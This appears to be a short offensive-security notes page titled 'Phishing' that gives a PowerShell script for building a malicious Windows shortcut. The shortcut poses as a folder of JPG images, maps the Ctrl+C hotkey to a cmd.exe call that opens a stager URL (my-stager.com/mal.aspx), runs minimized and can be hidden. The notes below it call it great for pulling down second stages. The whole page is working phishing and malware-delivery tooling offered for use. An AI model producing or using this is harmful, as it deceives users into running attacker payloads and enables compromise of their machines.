# Phishing

### Malicious LNK Generator&#x20;

```
$path                      = "$([Environment]::GetFolderPath('Desktop'))\Folder-Images.lnk"
$wshell                    = New-Object -ComObject Wscript.Shell
$shortcut                  = $wshell.CreateShortcut($path)

$shortcut.IconLocation     = "C:\Windows\System32\shell32.dll,4"

$shortcut.TargetPath       = "cmd.exe"
$shortcut.Arguments        = "/c start /b http://my-stager.com/mal.aspx"
$shortcut.WorkingDirectory = "C:"
$shortcut.HotKey           = "CTRL+C"
$shortcut.Description      = "Item Type: JPG Images"

$shortcut.WindowStyle      = 7
                           # 7 = Minimized window
                           # 3 = Maximized window
                           # 1 = Normal    window
$shortcut.Save()

(Get-Item $path).Attributes += 'Hidden' # Optional if we want to make the link invisible (prevent user clicks)

```

* Run in powershell ise it will give you a hidden lnk file that will map ctrl + c to your command.&#x20;
* Great for pulling down second stages and such&#x20;
